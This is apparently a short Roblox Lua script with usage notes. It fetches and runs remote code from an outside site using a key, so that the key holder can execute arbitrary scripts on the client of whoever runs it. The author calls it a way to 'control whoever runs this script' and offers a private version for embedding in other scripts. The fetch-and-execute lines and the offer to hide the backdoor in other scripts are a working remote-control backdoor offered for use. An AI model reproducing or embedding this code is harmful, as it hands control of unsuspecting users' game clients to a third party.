-- This script allows you to control whoever runs this script, from the site below.

-- There are two different ways to execute the script:

getgenv().controlconfig = {
    ["key"] = "943578345"
}

loadstring(game:HttpGet("https://roblox.ryuu.lol/control.lua"))()

-- Or

loadstring(game:HttpGet("https://roblox.ryuu.lol/control/943578345.lua"))()


-- 943578345 is the key, you can change it to whatever you want, if someone executes the script with that key, you can go on the webpage:
-- https://roblox.ryuu.lol/control/943578345
-- and execute scripts on whoever executed the script with that key.

-- SOME EXECUTORS DON'T ALLOW LOADSTRINGS, THE GETGENV LOADSTRING WORKED ON SOLARA FOR ME. IF IT DOESN'T WORK, OPEN THE LINK IN THE LOADSTRING FOR THE FULL CODE WITHOUT A LOADSTRING, THE LOADSTRING WITH getgenv().controlconfig WILL USE A RANDOM KEY IF ONLY USING THE CODE INSIDE, USE OTHER LOADSTRINGS CODE.

-- If you want to use this for production / add to your script, DM/Add ryuulol on discord, I can make a private one for you that is password protected.